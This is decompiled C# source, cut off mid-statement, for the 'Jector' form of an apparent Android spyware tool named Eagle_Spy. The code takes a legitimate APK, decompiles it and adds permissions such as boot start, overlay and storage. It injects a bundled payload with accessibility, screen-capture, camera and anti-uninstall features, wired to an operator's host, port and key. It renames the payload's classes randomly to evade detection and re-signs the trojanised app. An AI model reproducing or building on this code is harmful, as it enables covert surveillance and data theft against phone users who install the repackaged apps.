using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using DrakeUI.Framework;
using Eagle_Spy.My;
using Eagle_Spy.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x02000070 RID: 112
	[DesignerGenerated]
	public partial class Jector : Form
	{
		// Token: 0x17000175 RID: 373
		// (get) Token: 0x06000698 RID: 1688 RVA: 0x000B1608 File Offset: 0x000AF808
		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = base.CreateParams;
				createParams.ExStyle |= 128;
				return createParams;
			}
		}

		// Token: 0x0600069B RID: 1691 RVA: 0x000B45EC File Offset: 0x000B27EC
		public Jector()
		{
			base.FormClosing += this.Form1_FormClosing;
			base.Load += this.Form1_Load;
			this.N_RequestPermissions = "";
			this.N_RequestAccess = "";
			this.N_newEngineWorkerins = "AbddSfsvasDFBetgrnsrtnatrhjxyghwftgafsgxjbrTHAERdvergesrg";
			this.N_CommandsService = "";
			this.NStartScreenCap = "";
			this.N_WakeupActivity = "";
			this.N_RequestDraw = "";
			this.N_RequestBattery = "";
			this.N__CameraActivity_ = "";
			this.N__RequestCapScreen_ = "";
			this.N__webviewer_ = "";
			this.N_HandelScreenCap = "";
			this.newgetbyts = "";
			this.newsrvrun = "";
			this.split1 = "";
			this.split2 = "";
			this.split3 = "";
			this.split4 = "";
			this.newhost = "";
			this.newport = "";
			this.newkey = "";
			this.newalive = "";
			this.newname = "";
			this.neweco = "";
			this.newconect = "";
			this.newsokt = "";
			this.newstrtconct = "";
			this.newcnl = "";
			this.newcnm = "";
			this.newsndmthd = "";
			this.newforuce = "";
			this.newplgs = "";
			this.NEWRANDOM = "";
			this.usersper = "";
			this.usedraw = "";
			this.useruninstall = "";
			this.ALLPRIMSLIST = new List<string>();
			this.cou = 1;
			this.TK = "BSN12345678901234567";
			this.need_write = false;
			this.need_battery = false;
			this.need_read = false;
			this.need_forground = false;
			this.need_syswinow = false;
			this.need_boot = false;
			this.need_all = false;
			this.ASKPRIM_all = false;
			this.Once = false;
			this.HoldMainThread = false;
			this.WorkingDir = "";
			this.FoundJava = false;
			this.apktemp = "";
			this.apktoolpath = "";
			this.Apksignerpath = "";
			this.ApkZIPpath = "";
			this.outputapk = "";
			this.originalapkname = "";
			this.Apkeditorpath = "";
			this.protectfinished = false;
			this.rshit = null;
			this.cou3 = 0;
			this.InitializeComponent();
		}

		// Token: 0x0600069C RID: 1692 RVA: 0x000B488C File Offset: 0x000B2A8C
		public void Translateme()
		{
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				this.ComboPrims.Text = "فقط المطلوبة";
				this.Label7.Text = "إسم المستخدم";
				this.Label3.Text = "مفتاح الاتصال";
				this.Label1.Text = "هوست او أيبي";
				this.Label2.Text = "المنفذ";
				this.Label4.Text = "مجلد التطبيق الهدف";
				this.Button1.Text = "إختيار";
				this.Label5.Text = "ملف الحقن الهدف (.smali)";
				this.addactiv.Text = "إضافة";
				this.removeactiv.Text = "حذف";
				this.checksuper.Text = "صلاحية الوصول";
				this.checkkill.Text = "منع الحذف";
				this.checkautoclick.Text = "صلاحيات تلقائية";
				this.checkDraw.Text = "صلاحية ظهور فوق التطبيقات";
				this.Label14.Text = "الصلاحيات";
				this.titletext.Watermark = "عنوان الأشعار";
				this.msgtext.Watermark = "محتوى الأشعار";
				this.Label12.Text = "إشعار مخصص";
				this.CheckAutomatic.Text = Codes.Translate(this.CheckAutomatic.Text, "en", "ar");
				this.checkonlymain.Text = Codes.Translate(this.checkonlymain.Text, "en", "ar");
				this.checkprotector.Text = Codes.Translate(this.checkprotector.Text, "en", "ar");
				this.selectapkbtn.Text = Codes.Translate(this.selectapkbtn.Text, "en", "ar");
				this.addactiv.Text = Codes.Translate(this.addactiv.Text, "en", "ar");
				this.removeactiv.Text = Codes.Translate(this.removeactiv.Text, "en", "ar");
				this.Label6.Text = Codes.Translate(this.Label6.Text, "en", "ar");
				this.Button3.Text = "حقن";
				this.maintapcontrols.TabPages[0].Text = "الأتصال";
				this.maintapcontrols.TabPages[1].Text = "الهدف";
				this.maintapcontrols.TabPages[2].Text = "إعدادات";
				this.maintapcontrols.TabPages[3].Text = "بناء";
				this.checkkeepscreen.Text = "إبقاء الشاشة مضاءة";
				return;
			}
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				this.ComboPrims.Text = "Only Needed";
				return;
			}
			this.ComboPrims.Text = "只需要";
			this.Label7.Text = "用户名";
			this.Label3.Text = "连接键";
			this.Label1.Text = "主机名或 IP";
			this.Label2.Text = "连接端口";
			this.Label4.Text = "目标应用文件夹";
			this.Button1.Text = "选择";
			this.Label5.Text = "目标活动文件 (.smali)";
			this.addactiv.Text = "添加";
			this.removeactiv.Text = "删除";
			this.checksuper.Text = "无障碍服务";
			this.checkkill.Text = "反删除";
			this.checkautoclick.Text = "自动授予权限";
			this.checkDraw.Text = "授予在应用程序上绘制";
			this.checkkeepscreen.Text = "保持屏幕开启";
			this.CheckAutomatic.Text = Codes.Translate(this.CheckAutomatic.Text, "en", "zh");
			this.checkonlymain.Text = Codes.Translate(this.checkonlymain.Text, "en", "zh");
			this.checkprotector.Text = Codes.Translate(this.checkprotector.Text, "en", "zh");
			this.selectapkbtn.Text = Codes.Translate(this.selectapkbtn.Text, "en", "zh");
			this.addactiv.Text = Codes.Translate(this.addactiv.Text, "en", "zh");
			this.removeactiv.Text = Codes.Translate(this.removeactiv.Text, "en", "zh");
			this.Label6.Text = Codes.Translate(this.Label6.Text, "en", "zh");
			this.Label14.Text = "权限";
			this.titletext.Watermark = "通知标题";
			this.msgtext.Watermark = "通知消息";
			this.Label12.Text = "自定义通知";
			this.Button3.Text = "开始";
			this.maintapcontrols.TabPages[0].Text = "联系";
			this.maintapcontrols.TabPages[1].Text = "目标";
			this.maintapcontrols.TabPages[2].Text = "选项";
			this.maintapcontrols.TabPages[3].Text = "注入";
		}

		// Token: 0x0600069D RID: 1693 RVA: 0x000B4E30 File Offset: 0x000B3030
		public object RandomShit(int minCharacters, int maxCharacters)
		{
			string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
			if (this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init == null)
			{
				Interlocked.CompareExchange<StaticLocalInitFlag>(ref this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init, new StaticLocalInitFlag(), null);
			}
			bool flag = false;
			try
			{
				Monitor.Enter(this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init, ref flag);
				if (this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State == 0)
				{
					this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State = 2;
					this._0024STATIC_0024RandomShit_00242021C88_0024r = new Random();
				}
				else if (this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init.State = 1;
				if (flag)
				{
					Monitor.Exit(this._0024STATIC_0024RandomShit_00242021C88_0024r_0024Init);
				}
			}
			int num = this._0024STATIC_0024RandomShit_00242021C88_0024r.Next(minCharacters, maxCharacters);
			StringBuilder stringBuilder = new StringBuilder();
			int num2 = num;
			checked
			{
				for (int i = 1; i <= num2; i++)
				{
					int num3 = this._0024STATIC_0024RandomShit_00242021C88_0024r.Next(0, text.Length);
					stringBuilder.Append(text.Substring(num3, 1));
				}
				this.cou++;
				return stringBuilder.ToString() + Conversions.ToString(this.cou);
			}
		}

		// Token: 0x0600069E RID: 1694 RVA: 0x000B4F44 File Offset: 0x000B3144
		private int GenerateRandomNumber(int m0, int m1)
		{
			if (this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init == null)
			{
				Interlocked.CompareExchange<StaticLocalInitFlag>(ref this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init, new StaticLocalInitFlag(), null);
			}
			bool flag = false;
			try
			{
				Monitor.Enter(this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init, ref flag);
				if (this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State == 0)
				{
					this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State = 2;
					this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number = new Random();
				}
				else if (this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init.State = 1;
				if (flag)
				{
					Monitor.Exit(this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number_0024Init);
				}
			}
			return this._0024STATIC_0024GenerateRandomNumber_0024202888_0024Random_Number.Next(m0, m1);
		}

		// Token: 0x0600069F RID: 1695 RVA: 0x000B4FF0 File Offset: 0x000B31F0
		private void Button1_Click(object sender, EventArgs e)
		{
			FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
			folderBrowserDialog.RootFolder = Environment.SpecialFolder.Desktop;
			folderBrowserDialog.SelectedPath = "C:\\";
			folderBrowserDialog.Description = "Select Path for Decompile Apk";
			if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
			{
				this.FolderPath.Text = folderBrowserDialog.SelectedPath;
				this.TheApkPath = this.FolderPath.Text;
			}
		}

		// Token: 0x060006A0 RID: 1696 RVA: 0x000B504C File Offset: 0x000B324C
		private void addactiv_click(object sender, EventArgs e)
		{
			string text = Conversions.ToString(5);
			if (this.FolderPath.Text == null)
			{
				EagleAlert.ShowWarning("Select Apk Folder First");
				return;
			}
			text = this.FolderPath.Text;
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.InitialDirectory = text;
			openFileDialog.Multiselect = true;
			openFileDialog.DefaultExt = ".smali";
			openFileDialog.Title = "Select Path for Apk Activity to inject";
			string[] array = new string[3];
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			array = openFileDialog.FileNames;
			string[] array2 = array;
			string[] array3 = array2;
			foreach (string text2 in array3)
			{
				string text3 = text2;
				if (text3.ToLower().EndsWith(".smali") && !this.Activlist.Items.Contains(text3.Replace(text, ">")))
				{
					this.Activlist.Items.Add(text3.Replace(text, ">"));
				}
			}
		}

		// Token: 0x060006A1 RID: 1697 RVA: 0x00004164 File Offset: 0x00002364
		private string D(string v)
		{
			return Encoding.UTF8.GetString(Convert.FromBase64String(v));
		}

		// Token: 0x060006A2 RID: 1698 RVA: 0x000B5140 File Offset: 0x000B3340
		private void Button3_Click(object sender, EventArgs e)
		{
			this.log.Text = "";
			if (this.CheckAllValuse())
			{
				this.log.AppendText("Starting Injection...");
				this.Button3.Enabled = false;
				this.Startwork();
				return;
			}
			this.log.Text = "check values";
		}

		// Token: 0x060006A3 RID: 1699 RVA: 0x000B5198 File Offset: 0x000B3398
		private void cmdOutputHandler(object sender, DataReceivedEventArgs e)
		{
			if (string.IsNullOrEmpty(e.Data))
			{
				return;
			}
			checked
			{
				try
				{
					Jector._Closure_0024__289_002D0 closure_0024__289_002D = null;
					Jector._Closure_0024__289_002D0 CS_0024_003C_003E8__locals0 = new Jector._Closure_0024__289_002D0(closure_0024__289_002D);
					CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
					CS_0024_003C_003E8__locals0._0024VB_0024Local_msg = e.Data;
					if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("java is not recognized"))
					{
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate
						{
							this.log.AppendText(Environment.NewLine + "> Java not installed : go to google and install (java jdk)");
						}));
					}
					if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.StartsWith("I:"))
					{
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate
						{
							CS_0024_003C_003E8__locals0._0024VB_0024Me.log.AppendText(Environment.NewLine + CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Replace("I:", "> "));
						}));
					}
					else if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("[PROTECT]") && !CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("Writing:"))
					{
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate
						{
							CS_0024_003C_003E8__locals0._0024VB_0024Me.log.AppendText(Environment.NewLine + CS_0024_003C_003E8__locals0._0024VB_0024Local_msg);
						}));
					}
					else if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.StartsWith("E:"))
					{
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate
						{
							CS_0024_003C_003E8__locals0._0024VB_0024Me.log.AppendText(Environment.NewLine + CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Replace("E:", "ERROR :"));
						}));
					}
					if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("[PROTECT] Saved to"))
					{
						this.protectfinished = true;
					}
					if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("Java(TM)") | CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("OpenJDK"))
					{
						if (!this.Once)
						{
							this.Once = true;
							base.Invoke(new VB_0024AnonymousDelegate_0(delegate
							{
								this.log.AppendText(Environment.NewLine + "> Extract New Data..");
							}));
							this.originalapkname = Path.GetFileName(this.TargetApktext.Text);
							File.Copy(this.TargetApktext.Text, this.WorkingDir + "\\temp.apk");
							File.WriteAllBytes(this.apktoolpath, Resources.apktool);
							File.WriteAllBytes(this.Apksignerpath, Resources.signapk);
							File.WriteAllBytes(this.ApkZIPpath, Resources.zipalign);
							File.WriteAllBytes(this.Apkeditorpath, Resources.APKEditor);
							base.Invoke(new VB_0024AnonymousDelegate_0(delegate
							{
								this.log.AppendText(Environment.NewLine + "> Decompile Apk Start..");
							}));
							this.ExecuteCommand("cd " + this.WorkingDir);
							this.ExecuteCommand(string.Concat(new string[] { "java -jar \"", this.apktoolpath, "\" d -f \"", this.apktemp, "\" -o \"", this.TheApkPath, "\"" }));
						}
					}
					else if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("Copying original files"))
					{
						this.HoldMainThread = false;
					}
					else if (CS_0024_003C_003E8__locals0._0024VB_0024Local_msg.Contains("Built apk"))
					{
						while (!File.Exists(this.outputapk))
						{
							Thread.Sleep(1000);
						}
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate
						{
							this.log.AppendText(Environment.NewLine + "> Zip Align..");
						}));
						string text = string.Concat(new string[]
						{
							this.ApkZIPpath,
							" 4 \"",
							this.outputapk,
							"\" \"",
							this.outputapk.Replace("Ready.apk", "Ready_zip.apk"),
							"\""
						});
						string text2 = this.outputapk.Replace("Ready.apk", "Ready_zip.apk");
						this.ExecuteCommand(text);
						while (!File.Exists(text2))
						{
							Thread.Sleep(5000);
						}
						File.Delete(this.outputapk);
						if (this.checkprotector.Checked)
						{
							base.Invoke(new VB_0024AnonymousDelegate_0(delegate
							{
								this.log.AppendText(Environment.NewLine + "> Protect Apk..");
							}));
							string text3 = text2.Replace(".apk", "_protected.apk");
							string text4 = string.Concat(new string[] { "java -jar ", this.Apkeditorpath, " p  -i \"", text2, "\"" });
							this.ExecuteCommand(text4);
							while (!File.Exists(text3) | !this.protectfinished)
							{
								Thread.Sleep(1000);
							}
							File.Delete(text2);
							text2 = text3;
						}
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate
						{
							this.log.AppendText(Environment.NewLine + "> Sign APK..");
						}));
						File.WriteAllBytes(this.WorkingDir + "\\certificate.pem", Resources.c);
						File.WriteAllBytes(this.WorkingDir + "\\key.pk8", Resources.k);
						string text5 = this.WorkingDir + "\\out\\" + this.originalapkname.Replace(".apk", "_Jected.apk");
						string text6 = string.Concat(new string[]
						{
							"java -jar \"",
							this.Apksignerpath,
							"\" sign --key ",
							this.WorkingDir,
							"\\key.pk8 --cert ",
							this.WorkingDir,
							"\\certificate.pem  --v2-signing-enabled true --v3-signing-enabled true --out \"",
							this.WorkingDir,
							"\\out\\",
							this.originalapkname.Replace(".apk", "_Jected.apk"),
							"\" \"",
							text2,
							"\""
						});
						this.ExecuteCommand(text6);
						while (!File.Exists(text5))
						{
							Thread.Sleep(5000);
						}
						File.Delete(text2);
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate
						{
							this.log.AppendText(string.Concat(new string[]
							{
								Environment.NewLine,
								"-----------Finished-------------",
								Environment.NewLine,
								"> Host: ",
								this.Host.Text,
								Environment.NewLine,
								"> Port: ",
								this.Port.Text,
								Environment.NewLine,
								"> App: ",
								this.originalapkname.Replace(".apk", "")
							}));
						}));
						int num = 1;
						do
						{
							Thread.Sleep(100);
							Application.DoEvents();
							num++;
						}
						while (num <= 30);
						Process.Start(this.WorkingDir + "\\out");
						this.StopCommandPrompt();
					}
				}
				catch (Exception ex)
				{
					Jector._Closure_0024__289_002D1 closure_0024__289_002D2 = null;
					Jector._Closure_0024__289_002D1 CS_0024_003C_003E8__locals1 = new Jector._Closure_0024__289_002D1(closure_0024__289_002D2);
					CS_0024_003C_003E8__locals1._0024VB_0024Me = this;
					Exception ex2 = ex;
					CS_0024_003C_003E8__locals1._0024VB_0024Local_ex = ex2;
					base.Invoke(new VB_0024AnonymousDelegate_0(delegate
					{
						CS_0024_003C_003E8__locals1._0024VB_0024Me.log.AppendText(Environment.NewLine + "Global Error: " + CS_0024_003C_003E8__locals1._0024VB_0024Local_ex.Message);
					}));
				}
			}
		}

		// Token: 0x060006A4 RID: 1700 RVA: 0x000B5774 File Offset: 0x000B3974
		private void StopCommandPrompt()
		{
			try
			{
				this.cmdProcess.CloseMainWindow();
				this.cmdProcess.Close();
				this.cmdProcess.Dispose();
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060006A5 RID: 1701 RVA: 0x00004176 File Offset: 0x00002376
		private void ExecuteCommand(string command)
		{
			this.cmdProcess.StandardInput.WriteLine(command);
			this.cmdProcess.StandardInput.Flush();
		}

		// Token: 0x060006A6 RID: 1702 RVA: 0x000B57B8 File Offset: 0x000B39B8
		public void Startwork()
		{
			if (this.CheckAutomatic.Checked)
			{
				this.log.AppendText(Environment.NewLine + "> Automatic injection Started..");
				this.log.AppendText(Environment.NewLine + "> Preparation Started..");
				this.HoldMainThread = true;
				Codes.GetDriv();
				string text;
				try
				{
					text = Codes.GenerateRandomFolderName("jector");
				}
				catch (Exception ex)
				{
					Exception ex2 = ex;
					this.log.AppendText("Error Create Work Folder:" + ex2.Message);
					return;
				}
				this.WorkingDir = text;
				this.TheApkPath = this.WorkingDir + "\\temp";
				if (!Directory.Exists(this.TheApkPath))
				{
					Directory.CreateDirectory(this.TheApkPath);
				}
				this.cmdProcess = new Process();
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = "cmd.exe";
				processStartInfo.RedirectStandardOutput = true;
				processStartInfo.RedirectStandardInput = true;
				processStartInfo.RedirectStandardError = true;
				processStartInfo.UseShellExecute = false;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				this.cmdProcess.EnableRaisingEvents = true;
				this.cmdProcess.StartInfo = processStartInfo;
				this.cmdProcess.OutputDataReceived += this.cmdOutputHandler;
				this.cmdProcess.ErrorDataReceived += this.cmdOutputHandler;
				this.cmdProcess.Start();
				this.cmdProcess.BeginOutputReadLine();
				this.cmdProcess.BeginErrorReadLine();
				this.apktemp = text + "\\temp.apk";
				this.apktoolpath = text + "\\apktool.jar";
				this.Apksignerpath = text + "\\signapk.jar";
				this.ApkZIPpath = text + "\\zipalign.exe";
				this.Apkeditorpath = text + "\\ApkEditor.jar";
				this.ExecuteCommand("java -version");
				do
				{
					Thread.Sleep(1);
					Application.DoEvents();
				}
				while (this.HoldMainThread);
			}
			else
			{
				this.log.AppendText(Environment.NewLine + "> Manually injection Started...");
			}
			this.log.AppendText(Environment.NewLine + "> Check Permissions...");
			while (Codes.FileInUse(this.TheApkPath + "\\AndroidManifest.xml") | !File.Exists(this.TheApkPath + "\\AndroidManifest.xml"))
			{
				Thread.Sleep(1000);
			}
			string text2 = this.UpdateVersions(File.ReadAllText(this.TheApkPath + "\\AndroidManifest.xml"));
			string text5;
			checked
			{
				try
				{
					if (!text2.ToLower().Contains("android.permission.WRITE_EXTERNAL_STORAGE".ToLower()))
					{
						this.need_write = true;
					}
					if (!text2.ToLower().Contains("android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS".ToLower()))
					{
						this.need_battery = true;
					}
					if (!text2.ToLower().Contains("android.permission.READ_EXTERNAL_STORAGE".ToLower()))
					{
						this.need_read = true;
					}
					if (!text2.ToLower().Contains("android.permission.FOREGROUND_SERVICE".ToLower()))
					{
						this.need_forground = true;
					}
					if (!text2.ToLower().Contains("android.permission.SYSTEM_ALERT_WINDOW".ToLower()))
					{
						this.need_syswinow = true;
					}
					if (!text2.ToLower().Contains("android.permission.RECEIVE_BOOT_COMPLETED".ToLower()))
					{
						this.need_boot = true;
					}
					if (Operators.CompareString(this.ComboPrims.Text, "Only Needed", false) != 0)
					{
						this.need_all = true;
						this.ASKPRIM_all = true;
						string[] array = Resources.ALLPRIM.Split(new char[] { '#' });
						string[] array2 = array;
						string[] array3 = array2;
						foreach (string text3 in array3)
						{
							try
							{
								if (!string.IsNullOrEmpty(text3) && !text2.ToLower().Contains(text3.ToLower()))
								{
									this.ALLPRIMSLIST.Add(text3);
								}
							}
							catch (Exception)
							{
							}
						}
					}
					this.log.AppendText(Environment.NewLine + "> Coding AndroidManifest...");
					this.cou = this.GenerateRandomNumber(0, 5000);
					this.NStartScreenCap = Conversions.ToString(this.RandommMad(25, 35));
					this.N_CommandsService = Conversions.ToString(this.RandommMad(25, 35));
					this.N_newEngineWorkerins = Conversions.ToString(this.RandommMad(25, 35));
					this.N_RequestAccess = Conversions.ToString(this.RandommMad(25, 35));
					this.N_RequestPermissions = Conversions.ToString(this.RandommMad(25, 35));
					this.N_HandelScreenCap = Conversions.ToString(this.RandommMad(25, 35));
					this.N_WakeupActivity = Conversions.ToString(this.RandommMad(25, 35));
					this.N_RequestDraw = Conversions.ToString(this.RandommMad(25, 35));
					this.N_RequestBattery = Conversions.ToString(this.RandommMad(25, 35));
					this.N__CameraActivity_ = Conversions.ToString(this.RandommMad(25, 35));
					this.N__RequestCapScreen_ = Conversions.ToString(this.RandommMad(25, 35));
					this.N__webviewer_ = Conversions.ToString(this.RandommMad(25, 35));
					string[] array5 = File.ReadAllLines(this.TheApkPath + "\\AndroidManifest.xml");
					while (Codes.FileInUse(this.TheApkPath + "\\apktool.yml") | !File.Exists(this.TheApkPath + "\\apktool.yml"))
					{
						Thread.Sleep(1000);
					}
					string[] array6 = File.ReadAllLines(this.TheApkPath + "\\apktool.yml");
					int num = array6.Length - 1;
					for (int j = 0; j <= num; j++)
					{
						if (array6[j].ToLower().Contains("targetSdkVersion".ToLower()))
						{
							array6[j] = "  targetSdkVersion: '29'";
							File.WriteAllLines(this.TheApkPath + "\\apktool.yml", array6);
							break;
						}
					}
					int num2 = array5.Length - 1;
					for (int k = 1; k <= num2; k++)
					{
						if (this.need_write && array5[k].ToLower().Contains("<uses-permission"))
						{
							array5[k] = array5[k] + "\r\n" + Resources.WritePrim;
							this.need_write = false;
						}
						if (this.need_battery && array5[k].ToLower().Contains("<uses-permission"))
						{
							array5[k] = array5[k] + "\r\n" + Resources.batteryprim;
							this.need_battery = false;
						}
						if (this.need_read && array5[k].ToLower().Contains("<uses-permission"))
						{
							array5[k] = array5[k] + "\r\n" + Resources.ReadPrim;
							this.need_read = false;
						}
						if (this.need_forground && array5[k].ToLower().Contains("<uses-permission"))
						{
							array5[k] = array5[k] + "\r\n" + Resources.FORGROUD;
							this.need_forground = false;
						}
						if (this.need_syswinow && array5[k].ToLower().Contains("<uses-permission"))
						{
							array5[k] = array5[k] + "\r\n" + Resources.SystemwindowPrim;
							this.need_syswinow = false;
						}
						if (this.need_boot && array5[k].ToLower().Contains("<uses-permission"))
						{
							array5[k] = array5[k] + "\r\n" + Resources.BootPrim;
							this.need_boot = false;
						}
						if (this.need_all && array5[k].ToLower().Contains("<uses-permission"))
						{
							foreach (string text4 in this.ALLPRIMSLIST)
							{
								array5[k] = array5[k] + "\r\n" + text4;
							}
							this.need_all = false;
						}
						if (array5[k].ToLower().Contains("<application"))
						{
							if (!array5[k].ToLower().Contains("requestLegacyExternalStorage".ToLower()))
							{
								array5[k] = array5[k].Replace("<application", "<application android:requestLegacyExternalStorage=\"true\"");
							}
							array5[k] = array5[k] + Environment.NewLine + Resources.CypherMini.Replace("RequestPermissions", this.N_RequestPermissions).Replace("RequestAccess", this.N_RequestAccess).Replace("EngineWorkerins", this.N_newEngineWorkerins)
								.Replace("CommandsService", this.N_CommandsService)
								.Replace("StartScreenCap", this.NStartScreenCap)
								.Replace("webviewer", this.N__webviewer_)
								.Replace("RequestCapScreen", this.N__RequestCapScreen_)
								.Replace("CameraActivity", this.N__CameraActivity_)
								.Replace("RequestBattery", this.N_RequestBattery)
								.Replace("HandelScreenCap", this.N_HandelScreenCap)
								.Replace("RequestDraw", this.N_RequestDraw)
								.Replace("WakeupActivity", this.N_WakeupActivity);
							break;
						}
					}
					File.WriteAllLines(this.TheApkPath + "\\AndroidManifest.xml", array5);
				}
				catch (Exception ex3)
				{
					Exception ex4 = ex3;
					this.log.AppendText("Error Manifest :" + ex4.Message);
				}
				text5 = null;
				try
				{
					this.log.AppendText(Environment.NewLine + "> Inject Data To Apk...");
					int num3 = 2;
					while (Directory.Exists(this.TheApkPath + "\\smali_classes" + num3.ToString()))
					{
						num3++;
						if (num3 > 16)
						{
							IL_09B1:
							if (text5 == null)
							{
								Directory.CreateDirectory(this.TheApkPath + "\\smali_classes2");
								Directory.CreateDirectory(this.TheApkPath + "\\smali_classes2\\effectservicecimpl\\marketpush");
								text5 = this.TheApkPath + "\\smali_classes2";
							}
							if (!File.Exists(text5 + "\\data.zip"))
							{
								File.WriteAllBytes(text5 + "\\data.zip", Resources.APPS);
							}
							ZipFile.ExtractToDirectory(text5 + "\\data.zip", text5);
							File.Delete(text5 + "\\data.zip");
							Thread.Sleep(1);
							if (!Directory.Exists(this.TheApkPath + "\\res\\xml"))
							{
								Directory.CreateDirectory(this.TheApkPath + "\\res\\xml");
							}
							File.WriteAllText(this.TheApkPath + "\\res\\xml\\accessibilityprivatesrcapp.xml", Resources.accessibilityprivatesrcapp);
							if (!Directory.Exists(this.TheApkPath + "\\res\\xml"))
							{
								Directory.CreateDirectory(this.TheApkPath + "\\res\\xml");
							}
							goto IL_0AE7;
						}
					}
					Directory.CreateDirectory(this.TheApkPath + "\\smali_classes" + num3.ToString());
					Directory.CreateDirectory(this.TheApkPath + "\\smali_classes" + num3.ToString() + "\\effectservicecimpl\\marketpush");
					text5 = this.TheApkPath + "\\smali_classes" + num3.ToString();
					goto IL_09B1;
				}
				catch (Exception ex5)
				{
					Exception ex6 = ex5;
					this.log.AppendText("Error Data :" + ex6.Message);
				}
			}
			IL_0AE7:
			checked
			{
				try
				{
					this.log.AppendText(Environment.NewLine + "> Encryption...");
					string[] files = Directory.GetFiles(text5 + "\\effectservicecimpl\\marketpush");
					int num4 = 30;
					int num5 = 35;
					this.newgetbyts = Conversions.ToString(this.RandomShit(30, 35));
					this.newsrvrun = Conversions.ToString(this.RandomShit(30, 35));
					this.split1 = Conversions.ToString(this.RandomShit(4, 4));
					this.split2 = Conversions.ToString(this.RandomShit(4, 4));
					this.split3 = Conversions.ToString(this.RandomShit(4, 4));
					this.split4 = Conversions.ToString(this.RandomShit(4, 4));
					this.newhost = Conversions.ToString(this.RandomShit(30, 35));
					this.newport = Conversions.ToString(this.RandomShit(30, 35));
					this.newkey = Conversions.ToString(this.RandomShit(30, 35));
					this.newalive = Conversions.ToString(this.RandomShit(30, 35));
					this.newname = Conversions.ToString(this.RandomShit(30, 35));
					this.neweco = Conversions.ToString(this.RandomShit(30, 35));
					this.newconect = Conversions.ToString(this.RandomShit(30, 35));
					this.newsokt = Conversions.ToString(this.RandomShit(30, 35));
					this.newstrtconct = Conversions.ToString(this.RandomShit(30, 35));
					this.newcnl = Conversions.ToString(this.RandomShit(30, 35));
					this.newcnm = Conversions.ToString(this.RandomShit(30, 35));
					this.newsndmthd = Conversions.ToString(this.RandomShit(30, 35));
					this.newplgs = Conversions.ToString(this.RandomShit(30, 35));
					this.NEWRANDOM = this.madladstr();
					this.newforuce = "QsdvgaerEARGar";
					string[] array7 = files;
					string[] array8 = array7;
					foreach (string text6 in array8)
					{
						string text7 = File.ReadAllText(text6).Replace("RequestPermissions", this.N_RequestPermissions).Replace("RequestAccess", this.N_RequestAccess)
							.Replace("EngineWorkerins", this.N_newEngineWorkerins)
							.Replace("CommandsService", this.N_CommandsService)
							.Replace("StartScreenCap", this.NStartScreenCap)
							.Replace("webviewer", this.N__webviewer_)
							.Replace("RequestCapScreen", this.N__RequestCapScreen_)
							.Replace("CameraActivity", this.N__CameraActivity_)
							.Replace("RequestBattery", this.N_RequestBattery)
							.Replace("HandelScreenCap", this.N_HandelScreenCap)
							.Replace("_METHOD_getbyte_", this.newgetbyts)
							.Replace("_mthd_issrvrun_", this.newsrvrun)
							.Replace("_splet_1_", this.split1)
							.Replace("_split_2_", this.split2)
							.Replace("_split_3_", this.split3)
							.Replace("_the_plugns_", this.newplgs)
							.Replace("_split_4_", this.split4)
